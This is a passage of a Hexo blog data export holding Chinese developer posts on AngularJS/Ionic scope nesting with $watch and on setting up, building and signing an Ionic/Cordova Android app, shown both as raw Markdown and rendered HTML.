id=\"controller部分：-1\"><a href=\"#controller部分：-1\" class=\"headerlink\" title=\"controller部分：\"></a>controller部分：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;).controller(&apos;FloorCtrl&apos;, function($scope)&#123;</span><br><span class=\"line\">    $scope.floorModel = &apos;&apos;; </span><br><span class=\"line\">    $scope.floorItems = [&apos;floorA&apos;, &apos;floorB&apos;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $scope.$watch(floorModel, function(newVal,oldVal)&#123;</span><br><span class=\"line\">        console.log(&apos;floorNewVal:&apos;+ newVal);</span><br><span class=\"line\">        if(newVal==oldVal)&#123;</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;value change&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"大坑\"><a href=\"#大坑\" class=\"headerlink\" title=\"大坑\"></a>大坑</h2><ol>\n<li><p>写模板的时候，ion-radio标签的value按照<a href=\"http://ionicframework.com/docs/api/directive/ionRadio/\" target=\"_blank\" rel=\"noopener\">官网</a>介绍作ng-value=”xxx”时，会有这样的bug：第一次选择时，总是选列表的最后一项，并且$watch只在值为数字的时候表现正常，按照angularJS的radio的value写法value=”xxx”，$watch就表现正常了，而其他页面却没有这个bug，目前实验多次均是这个结论，也算是个大坑了。<del>也由此得到的<strong>教训</strong>：出现很奇葩的bug的时候，一定要仔细求证语句写法；</del> 这不能怪本宝宝。</p>\n</li>\n<li><p>关于第二种写法，即controller写在ion-content上，如果没有用ng-repeat这种会生成child scope的用法时，就不用加$parent了；如果用了就必须加，因为嵌套了两层scope，而把controller写在ion-content上只消除一层scope嵌套。</p>\n</li>\n</ol>\n<h2 id=\"小知识点\"><a href=\"#小知识点\" class=\"headerlink\" title=\"小知识点\"></a>小知识点</h2><p>当$watch的第一个参数写成字符串不起作用时，可以这样写，第一个参数写成函数：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$scope.$watch(function()&#123;return $scope.a.floorModel&#125;, function(newVal, oldVal)&#123;&#125;);</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<p>使用ionic的时候，有这样的一个场景，需要对ion-radio使用ng-rapeat，以生成一个选项列表，并当选择选项的时候，检测值的改变。选项列表是放在一个ion-view中的，这其中涉及多层scope的嵌套：controller有一个顶层scope，ion-view在渲染的时候，会生成一个子scope，ng-repeat又会生成自己的scope，多个scope嵌套起来非常复杂，实现的时候搞得比较久，记录下结果：<br></p>","more":"<p></p>\n<h2 id=\"1、通过-state配置视图的controller-时的写法：\"><a href=\"#1、通过-state配置视图的controller-时的写法：\" class=\"headerlink\" title=\"1、通过$state配置视图的controller 时的写法：\"></a>1、通过$state配置视图的controller 时的写法：</h2><h3 id=\"app-js配置：\"><a href=\"#app-js配置：\" class=\"headerlink\" title=\"app.js配置：\"></a>app.js配置：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;,[&apos;ionic&apos;])</span><br><span class=\"line\">    .config(function($stateProvider, $urlRouterProvider)&#123;</span><br><span class=\"line\">        $stateProvider</span><br><span class=\"line\">            .state(&apos;floor&apos;,&#123;  </span><br><span class=\"line\">                url: &apos;/floor&apos;,</span><br><span class=\"line\">                templateUrl: &apos;templates/floor.html&apos;,</span><br><span class=\"line\">                controller: &apos;FloorCtrl&apos;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"模板部分写法：\"><a href=\"#模板部分写法：\" class=\"headerlink\" title=\"模板部分写法：\"></a>模板部分写法：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ion-view&gt;</span><br><span class=\"line\">    &lt;ion-content&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">            &lt;ion-list&gt;</span><br><span class=\"line\">                &lt;ion-radio ng-model=&quot;a.floorModel&quot; ng-repeat=&quot;floor in floorItems&quot; value=&quot;&#123;&#123;floor&#125;&#125;&quot;&gt;&#123;&#123;floor&#125;&#125;&lt;/ion-radio&gt;</span><br><span class=\"line\">            &lt;/ion-list&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/ion-content&gt;</span><br><span class=\"line\">&lt;/ion-view&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"controller部分：\"><a href=\"#controller部分：\" class=\"headerlink\" title=\"controller部分：\"></a>controller部分：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;).controller(&apos;FloorCtrl&apos;, function($scope)&#123;</span><br><span class=\"line\">    $scope.a = &#123;&quot;floorModel&quot;:&quot;&quot;&#125;; </span><br><span class=\"line\">    $scope.floorItems = [&apos;floorA&apos;, &apos;floorB&apos;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $scope.$watch(&quot;a.floorModel&quot;, function(newVal,oldVal)&#123;</span><br><span class=\"line\">        console.log(&apos;floorNewVal:&apos;+ newVal);</span><br><span class=\"line\">        if(newVal==oldVal)&#123;</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;value change&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"2、controller写在ion-content上可以减少一层scope\"><a href=\"#2、controller写在ion-content上可以减少一层scope\" class=\"headerlink\" title=\"2、controller写在ion-content上可以减少一层scope\"></a>2、controller写在ion-content上可以减少一层scope</h2><h3 id=\"模板部分写法：-1\"><a href=\"#模板部分写法：-1\" class=\"headerlink\" title=\"模板部分写法：\"></a>模板部分写法：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ion-view ng-controller=&quot;FloorCtrl&quot;&gt;</span><br><span class=\"line\">    &lt;ion-content&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">            &lt;ion-list&gt;</span><br><span class=\"line\">                &lt;ion-radio ng-model=&quot;$parent.floorModel&quot; ng-repeat=&quot;floor in floorItems&quot; value=&quot;&#123;&#123;floor&#125;&#125;&quot;&gt;&#123;&#123;floor&#125;&#125;&lt;/ion-radio&gt;</span><br><span class=\"line\">            &lt;/ion-list&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/ion-content&gt;</span><br><span class=\"line\">&lt;/ion-view&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"controller部分：-1\"><a href=\"#controller部分：-1\" class=\"headerlink\" title=\"controller部分：\"></a>controller部分：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;).controller(&apos;FloorCtrl&apos;, function($scope)&#123;</span><br><span class=\"line\">    $scope.floorModel = &apos;&apos;; </span><br><span class=\"line\">    $scope.floorItems = [&apos;floorA&apos;, &apos;floorB&apos;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $scope.$watch(floorModel, function(newVal,oldVal)&#123;</span><br><span class=\"line\">        console.log(&apos;floorNewVal:&apos;+ newVal);</span><br><span class=\"line\">        if(newVal==oldVal)&#123;</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;value change&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"大坑\"><a href=\"#大坑\" class=\"headerlink\" title=\"大坑\"></a>大坑</h2><ol>\n<li><p>写模板的时候，ion-radio标签的value按照<a href=\"http://ionicframework.com/docs/api/directive/ionRadio/\" target=\"_blank\" rel=\"noopener\">官网</a>介绍作ng-value=”xxx”时，会有这样的bug：第一次选择时，总是选列表的最后一项，并且$watch只在值为数字的时候表现正常，按照angularJS的radio的value写法value=”xxx”，$watch就表现正常了，而其他页面却没有这个bug，目前实验多次均是这个结论，也算是个大坑了。<del>也由此得到的<strong>教训</strong>：出现很奇葩的bug的时候，一定要仔细求证语句写法；</del> 这不能怪本宝宝。</p>\n</li>\n<li><p>关于第二种写法，即controller写在ion-content上，如果没有用ng-repeat这种会生成child scope的用法时，就不用加$parent了；如果用了就必须加，因为嵌套了两层scope，而把controller写在ion-content上只消除一层scope嵌套。</p>\n</li>\n</ol>\n<h2 id=\"小知识点\"><a href=\"#小知识点\" class=\"headerlink\" title=\"小知识点\"></a>小知识点</h2><p>当$watch的第一个参数写成字符串不起作用时，可以这样写，第一个参数写成函数：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$scope.$watch(function()&#123;return $scope.a.floorModel&#125;, function(newVal, oldVal)&#123;&#125;);</span><br></pre></td></tr></table></figure></p>"},{"title":"ionic + angularJS开发Hybrid App开发环境配置及打包踩坑记","date":"2016-06-14T05:30:00.000Z","toc":true,"comments":1,"_content":"\n公司之前使用appcan进行Hybrid App开发，其中遇到过许多问题，最严重的是性能差，所以新项目希望转向ionic + ng进行移动app开发。公司里之前没有人用过，于是领导就把这一光荣的任务交给了我，于是我就开始了~~自虐~~开心的踩坑过程！本文主要集中于开发环境的配置。\n<!-- More -->\n开始之前请先安装nodeJS。我首先是去[官网](http://ionicframework.com/getting-started/ \"ionic 官网\")看文档：\n# 1、安装Ionic #\n打开nodeJS的shell窗口，（曾试过直接在cmd窗口中输npm命令，会有奇怪的问题）输入\n`npm install -g cordova ionic`\n# 2、开始一个项目 #\n`ionic start myApp tabs`\n这句里的tabs还有两种选择：blank、sidemenu，分别对应不同种类的app界面。找到你的myApp文件夹，下面就是一个seed project，你可以在这个项目基础上进行开发你自己的APP。可以说到这里你已经完成了开发环境的配置，下面就属于把项目打包成手机安装包的过程了。\n# 3、打包 / 在手机上跑起来(android) #\n按照官网上的教程，建ios的APP命令如下：\n```\ncd myApp\nionic platform add ios\nionic build ios\nionic emulate ios\n```\n推测建安卓APP的时候，就应该把上面命令中的ios换成android：\n```\ncd myApp\nionic platform add android\nionic build android\n```\n当时走到这一步时看了别的教程，我直接用的下面的命令：\n```\ncd myApp\nionic platform add android\nionic run android\n```\n# 报错1 #\n输入之后报错了，错误信息：\n![ionic/7](http://o798x2hdw.bkt.clouddn.com/ionic/7.jpg)\n```\nError: Failed to find 'ANDROID_HOME' environment variable. Try setting setting it manually.\nFailed to find 'android' command in your 'PATH'. Try update your 'PATH' to include path to valid SDK directory.\n```\n把错误提示扔到谷歌里，找到StackOverflow上说**要安装android studio**，[这里是官网安装包下载地址](https://developer.android.com/studio/install.html \"android studio\")，需要翻墙且文件很大，1.2G，我用的[梯子](https://do1.glbproxy.tk/?r=1/?r=1&name=miao.hnlk@foxmail.com)，（通过这个链接购买的，你的账户可以增加10天），实在不想翻墙也可以找下国内的下载链接，只是版本都比较低。下载到一半，发现有同事现成下好的，大喜！\n# 报错2 #\n如果你输入platform那句之后，运行的这个命令：`ionic build android`，有这样的报错：\n那么建议你可以装一下android studio试试。\n![ionic/8](http://o798x2hdw.bkt.clouddn.com/ionic/8.jpg)\n```\nError: Please install Android target: \"android-23\".\nHint: Open the SDK manager by running: \"C:\\Users\\mary.tien\\AppData\\Local\\Android\n\\sdk\\tools\\android.bat\"\nYou will require:\n1. \"SDK Platform\" for android-23\n2. \"Android SDK Platform-tools (latest)\n3. \"Android SDK Build-tools\" (latest)\n```\n装好后，运行命令：`ionic build android`\n如果看到许多点点点，就是成功了，接下来是漫长等待……\n中间会出现很卧槽的东西：\n![ionic/9](http://o798x2hdw.bkt.clouddn.com/ionic/9.jpg)\n# Build成功，安装包打包完成 #\n但憋害怕，最终你会看到一个\"BUILD SUCCESSFUL\"\n![ionic/10](http://o798x2hdw.bkt.clouddn.com/ionic/10.jpg)\n其实到这里已经打包完成了，你可以在上图中的那个路径找到build好的apk文件，然后就可以发到手机上安装了。但我当时看教程，还有一句命令`ionic emulate android`，于是就继续往下走了。这个是在电脑上模拟手机上的效果的，可以有很多替代方案，所以如果在这个步骤被卡住了，完全可以先放下，之后采用别的方式。\n\n---\n\n\n# 额外知识1：电脑上模拟手机效果 #\n我在build successful之后输入`ionic emulate android`\n## 报错1 ##\n出了几行之后，卡住了：\n```\nPlease ensure Intel HAXM is properly installed and usable.\nCPU acceleration status: HAXM must be updated (version 1.1.1 < 6.0.1).\n```\n搜索之，找到这个[链接](http://www.cnblogs.com/csulennon/p/4178404.html),\n>HAXM作用是管理硬件加速的，估计是用了这个东西模拟器就能告别Eclipse时代的龟速。\n>你也可以在Inter官网下载这个HAXM，当然Android SDK已经集成了这个软件，你需要做的就是找到他，然后安装它就是了。\n>他的位置放在这个目录下：\n>![ionic/19](http://o798x2hdw.bkt.clouddn.com/ionic/19.png)\n\n但是里面的haxm链接打开是404，你得使用这个~~[链接](https://software.intel.com/zh-cn/android/articles/intel-hardware-accelerated-execution-manager-end-user-license-agreement)~~\n[链接](http://download.csdn.net/detail/xfortune/9462367)\n## 报错2 ##\n安装的时候会报错，我安装的时候报错，还跟po主的错误不一样：\n```Failed to configure driver:unknown error. Failed to open driver.\n```\n搜索之，找到这个[链接](https://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown)，解决办法如下：\n![ionic/13](http://o798x2hdw.bkt.clouddn.com/ionic/13.jpg)\n意思就是：\n\n1. 下载上面链接中的zip文件\n2. 解压到一个文件夹\n3. 复制\"hax_extract.cmd\"到“IntelHaxm.exe”所在的文件夹，\n4. 在复制过来的\"hax_extract.cmd\"上右键选择“以管理员身份运行”\n5. 在弹出框里选yes\n\n之后再安装“IntelHaxm.exe”就可以了。如果不行，这个链接里还有许多别人的评论，可以浏览下看有没有别的解决方案。\n## 成功 ##\n照这个步骤走完，果然安装成功，bravo！经过漫长的Error岁月，回过头来看我们的ionic窗口，已经卡死在那里了。关了重新打开一个node shell窗口，进去项目文件夹，输入`ionic emulate android`，发现HAXM竟被装了个更低的版本，傻眼！于是又找到这个[链接](http://download.csdn.net/detail/xfortune/9462367)，装上之后，重新打开node shell窗口，输入`ionic emulate android`，就可以啦！有一个手机模拟器，竟然有点激动，想哭有木有。\n![ionic/18](http://o798x2hdw.bkt.clouddn.com/ionic/18.jpg)\n\n\n# 额外知识2：两种打包命令 && 安装哪个apk？ #\n`cordova build --release android`\n`ionic build android [--debug | --release]`\n以下引用自这个[链接](http://blog.csdn.net/yourlin/article/details/48000083)\n\n1. 第二个命令默认不带参数输出为debug版本，配置正确情况下会在myApp/platform/Android/outputs/APK/下面生成，对应的APK文件。\n2. debug模式下会输出2个APK，一个是不带签名的，一个是带debug签名的，带debug签名的APK可以在手机上安装测试\n3. release模式下会输出1个不带数字签名APK，需要自己对该APK进行签名\n###额外知识3：APK数字签名###\n进入APK文件所在的目录 \n\n1. 先产生密钥文件 \n`keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore `\n这个-validity 40000，意思是证书有效期40000天 \n\n2. 再给文件签名 \n`jarsigner -verbose -keystore demo.keystore -signedjar CoderCalendar.apk android-release-unsigned.apk demo.keystore -digestalg SHA1 -sigalg MD5withRSA`\nCoderCalendar.apk 是我们生成的目标文件名 \nandroid-release-unsigned.apk 是需要被签名的APK文件\n\n\n\n\n***\n# 结语 #\n写出来觉得很少，而在实际操作中，遇到问题、找答案、一个个答案试错、以及下载1.2G安装包的过程，都是很崩溃的，体验了好几次“山重水复”和“柳暗花明”，记下一点经验，希望给同行的朋友一点参考。:)\n\t\n\t","source":"_posts/Ionic_AngularJS_Cordova_Hybrid_APP_Developing_Environment_And_Build.md","raw":"---\ntitle: ionic + angularJS开发Hybrid App开发环境配置及打包踩坑记\ndate: 2016-6-14 13:30:00\ncategories: 框架\ntags: [ionic,angularJS2,开发环境, webapp,] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n公司之前使用appcan进行Hybrid App开发，其中遇到过许多问题，最严重的是性能差，所以新项目希望转向ionic + ng进行移动app开发。公司里之前没有人用过，于是领导就把这一光荣的任务交给了我，于是我就开始了~~自虐~~开心的踩坑过程！本文主要集中于开发环境的配置。\n<!-- More -->\n开始之前请先安装nodeJS。我首先是去[官网](http://ionicframework.com/getting-started/ \"ionic 官网\")看文档：\n# 1、安装Ionic #\n打开nodeJS的shell窗口，（曾试过直接在cmd窗口中输npm命令，会有奇怪的问题）输入\n`npm install -g cordova ionic`\n# 2、开始一个项目 #\n`ionic start myApp tabs`\n这句里的tabs还有两种选择：blank、sidemenu，分别对应不同种类的app界面。找到你的myApp文件夹，下面就是一个seed project，你可以在这个项目基础上进行开发你自己的APP。可以说到这里你已经完成了开发环境的配置，下面就属于把项目打包成手机安装包的过程了。\n# 3、打包 / 在手机上跑起来(android) #\n按照官网上的教程，建ios的APP命令如下：\n```\ncd myApp\nionic platform add ios\nionic build ios\nionic emulate ios\n```\n推测建安卓APP的时候，就应该把上面命令中的ios换成android：\n```\ncd myApp\nionic platform add android\nionic build android\n```\n当时走到这一步时看了别的教程，我直接用的下面的命令：\n```\ncd myApp\nionic platform add android\nionic run android\n```\n# 报错1 #\n输入之后报错了，错误信息：\n![ionic/7](http://o798x2hdw.bkt.clouddn.com/ionic/7.jpg)\n```\nError: Failed to find 'ANDROID_HOME' environment variable. Try setting setting it manually.\nFailed to find 'android' command in your 'PATH'. Try update your 'PATH' to include path to valid SDK directory.\n```\n把错误提示扔到谷歌里，找到StackOverflow上说**要安装android studio**，[这里是官网安装包下载地址](https://developer.android.com/studio/install.html \"android studio\")，需要翻墙且文件很大，1.2G，我用的[梯子](https://do1.glbproxy.tk/?r=1/?r=1&name=miao.hnlk@foxmail.com)，（通过这个链接购买的，你的账户可以增加10天），实在不想翻墙也可以找下国内的下载链接，只是版本都比较低。下载到一半，发现有同事现成下好的，大喜！\n# 报错2 #\n如果你输入platform那句之后，运行的这个命令：`ionic build android`，有这样的报错：\n那么建议你可以装一下android studio试试。\n![ionic/8](http://o798x2hdw.bkt.clouddn.com/ionic/8.jpg)\n```\nError: Please install Android target: \"android-23\".\nHint: Open the SDK manager by running: \"C:\\Users\\mary.tien\\AppData\\Local\\Android\n\\sdk\\tools\\android.bat\"\nYou will require:\n1. \"SDK Platform\" for android-23\n2. \"Android SDK Platform-tools (latest)\n3. \"Android SDK Build-tools\" (latest)\n```\n装好后，运行命令：`ionic build android`\n如果看到许多点点点，就是成功了，接下来是漫长等待……\n中间会出现很卧槽的东西：\n![ionic/9](http://o798x2hdw.bkt.clouddn.com/ionic/9.jpg)\n# Build成功，安装包打包完成 #\n但憋害怕，最终你会看到一个\"BUILD SUCCESSFUL\"\n![ionic/10](http://o798x2hdw.bkt.clouddn.com/ionic/10.jpg)\n其实到这里已经打包完成了，你可以在上图中的那个路径找到build好的apk文件，然后就可以发到手机上安装了。但我当时看教程，还有一句命令`ionic emulate android`，于是就继续往下走了。这个是在电脑上模拟手机上的效果的，可以有很多替代方案，所以如果在这个步骤被卡住了，完全可以先放下，之后采用别的方式。\n\n---\n\n\n# 额外知识1：电脑上模拟手机效果 #\n我在build successful之后输入`ionic emulate android`\n## 报错1 ##\n出了几行之后，卡住了：\n```\nPlease ensure Intel HAXM is properly installed and usable.\nCPU acceleration status: HAXM must be updated (version 1.1.1 < 6.0.1).\n```\n搜索之，找到这个[链接](http://www.cnblogs.com/csulennon/p/4178404.html),\n>HAXM作用是管理硬件加速的，估计是用了这个东西模拟器就能告别Eclipse时代的龟速。\n>你也可以在Inter官网下载这个HAXM，当然Android SDK已经集成了这个软件，你需要做的就是找到他，然后安装它就是了。\n>他的位置放在这个目录下：\n>![ionic/19](http://o798x2hdw.bkt.clouddn.com/ionic/19.png)\n\n但是里面的haxm链接打开是404，你得使用这个~~[链接](https://software.intel.com/zh-cn/android/articles/intel-hardware-accelerated-execution-manager-end-user-license-agreement)~~\n[链接](http://download.csdn.net/detail/xfortune/9462367)\n## 报错2 ##\n安装的时候会报错，我安装的时候报错，还跟po主的错误不一样：\n```Failed to configure driver:unknown error. Failed to open driver.\n```\n搜索之，找到这个[链接](https://software.intel.com/en-us/blogs/2013/04/25/workaround-patch-for-haxm-installation-error-failed-to-configure-driver-unknown)，解决办法如下：\n![ionic/13](http://o798x2hdw.bkt.clouddn.com/ionic/13.jpg)\n意思就是：\n\n1. 下载上面链接中的zip文件\n2. 解压到一个文件夹\n3. 复制\"hax_extract.cmd\"到“IntelHaxm.exe”所在的文件夹，\n4. 在复制过来的\"hax_extract.cmd\"上右键选择“以管理员身份运行”\n5. 在弹出框里选yes\n\n之后再安装“IntelHaxm.exe”就可以了。如果不行，这个链接里还有许多别人的评论，可以浏览下看有没有别的解决方案。\n## 成功 ##\n照这个步骤走完，果然安装成功，bravo！经过漫长的Error岁月，回过头来看我们的ionic窗口，已经卡死在那里了。关了重新打开一个node shell窗口，进去项目文件夹，输入`ionic emulate android`，发现HAXM竟被装了个更低的版本，傻眼！于是又找到这个[链接](http://download.csdn.net/detail/xfortune/9462367)，装上之后，重新打开node shell窗口，输入`ionic emulate android`，就可以啦！有一个手机模拟器，竟然有点激动，想哭有木有。\n![ionic/18](http://o798x2hdw.bkt.clouddn.com/ionic/18.jpg)\n\n\n# 额外知识2：两种打包命令 && 安装哪个apk？ #\n`cordova build --release android`\n`ionic build android [--debug | --release]`\n以下引用自这个[链接](http://blog.csdn.net/yourlin/article/details/48000083)\n\n1. 第二个命令默认不带参数输出为debug版本，配置正确情况下会在myApp/platform/Android/outputs/APK/下面生成，对应的APK文件。\n2. debug模式下会输出2个APK，一个是不带签名的，一个是带debug签名的，带debug签名的APK可以在手机上安装测试\n3. release模式下会输出1个不带数字签名APK，需要自己对该APK进行签名\n###额外知识3：APK数字签名###\n进入APK文件所在的目录 \n\n1. 先产生密钥文件 \n`keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore `\n这个-validity 40000，意思是证书有效期40000天 \n\n2. 再给文件签名 \n`jarsigner -verbose -keystore demo.keystore -signedjar CoderCalendar.apk android-release-unsigned.apk demo.keystore -digestalg SHA1 -sigalg MD5withRSA`\nCoderCalendar.apk 是我们生成的目标文件名 \nandroid-release-unsigned.apk 是需要被签名的APK文件\n\n\n\n\n***\n# 结语 #\n写出来觉得很少，而在实际操作中，遇到问题、找答案、一个个答案试错、以及下载1.2G安装包的过程，都是很崩溃的，体验了好几次“山重水复”和“柳暗花明”，记下一点经验，希望给同行的朋友一点参考。:)\n\t\n\t","slug":"Ionic_AngularJS_Cordova_Hybrid_APP_Developing_Environment_And_Build","published":1,"updated":"2018-05-07T10:29:59.526Z","layout":"post","photos":[],"link":"","_id":"cjgw4444700028d9537emrwiw","content":"<p>公司之前使用appcan进行Hybrid App开发，其中遇到过许多问题，最严重的是性能差，所以新项目希望转向ionic + ng进行移动app开发。公司里之前没有人用过，于是领导就把这一光荣的任务交给了我，于是我就开始了<del>自虐</del>开心的踩坑过程！本文主要集中于开发环境的配置。<br><a id=\"more\"></a><br>开始之前请先安装nodeJS。我首先是去<a href=\"http://ionicframework.com/getting-started/\" title=\"ionic 官网\" target=\"_blank\" rel=\"noopener\">官网</a>看文档：</p>\n<h1 id=\"1、安装Ionic\"><a href=\"#1、安装Ionic\" class=\"headerlink\" title=\"1、安装Ionic\"></a>1、安装Ionic</h1><p>打开nodeJS的shell窗口，（曾试过直接在cmd窗口中输npm命令，会有奇怪的问题）输入<br><code>npm install -g cordova ionic</code></p>\n<h1 id=\"2、开始一个项目\"><a href=\"#2、开始一个项目\" class=\"headerlink\" title=\"2、开始一个项目\"></a>2、开始一个项目</h1><p><code>ionic start myApp tabs</code><br>这句里的tabs还有两种选择：blank、sidemenu，分别对应不同种类的app界面。找到你的myApp文件夹，下面就是一个seed project，你可以在这个项目基础上进行开发你自己的APP。可以说到这里你已经完成了开发环境的配置，下面就属于把项目打包成手机安装包的过程了。</p>\n<h1 id=\"3、打包-在手机上跑起来-android\"><a href=\"#3、打包-在手机上跑起来-android\" class=\"headerlink\" title=\"3、打包 / 在手机上跑起来(android)\"></a>3、打包 / 在手机上跑起来(android)</h1><p>按照官网上的教程，建ios的APP命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add ios</span><br><span class=\"line\">ionic build ios</span><br><span class=\"line\">ionic emulate ios</span><br></pre></td></tr></table></figure></p>\n<p>推测建安卓APP的时候，就应该把上面命令中的ios换成android：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add android</span><br><span class=\"line\">ionic build android</span><br></pre></td></tr></table></figure></p>\n<p>当时走到这一步时看了别的教程，我直接用的下面的命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myApp</span><br><span class=\"line\">ionic platform add android</span><br><span class=\"line\">ionic run android</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"报错1\"><a href=\"#报错1\" class=\"headerlink\" title=\"报错1\"></a>报错1</h1><p>输入之后报错了，错误信息：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/7.jpg\" alt=\"ionic/7\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Failed to find &apos;ANDROID_HOME&apos; environment variable. Try setting setting it manually.</span><br><span class=\"line\">Failed to find &apos;android&apos; command in your &apos;PATH&apos;. Try update your &apos;PATH&apos; to include path to valid SDK directory.</span><br></pre></td></tr></table></figure></p>\n<p>把错误提示扔到谷歌里，找到StackOverflow上说<strong>要安装android studio</strong>，<a href=\"https://developer.android.com/studio/install.html\" title=\"android studio\" target=\"_blank\" rel=\"noopener\">这里是官网安装包下载地址</a>，需要翻墙且文件很大，1.2G，我用的<a href=\"https://do1.glbproxy.tk/?r=1/?r=1&amp;name=miao.hnlk@foxmail.com\" target=\"_blank\" rel=\"noopener\">梯子</a>，（通过这个链接购买的，你的账户可以增加10天），实在不想翻墙也可以找下国内的下载链接，只是版本都比较低。下载到一半，发现有同事现成下好的，大喜！</p>\n<h1 id=\"报错2\"><a href=\"#报错2\" class=\"headerlink\" title=\"报错2\"></a>报错2</h1><p>如果你输入platform那句之后，运行的这个命令：<code>ionic build android</code>，有这样的报错：<br>那么建议你可以装一下android studio试试。<br><img src=\"http://o798x2hdw.bkt.clouddn.com/ionic/8.jpg\" alt=\"ionic/8\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Please install Android target: &quot;android-23&quot;.</span><br><span class=\"line\">Hint: Open the SDK manager by running: &quot;C:\\Users\\mary.tien\\AppData\\Local\\Android</span><br><span class=\"line\">\\sdk\\tools\\android.bat&quot;</span><br><span class=\"line\">You will require:</span><br><span class=\"line\">1. &quot;SDK Platform&quot; for android-23</span><br><span class=\"line\">2. &quot;Android 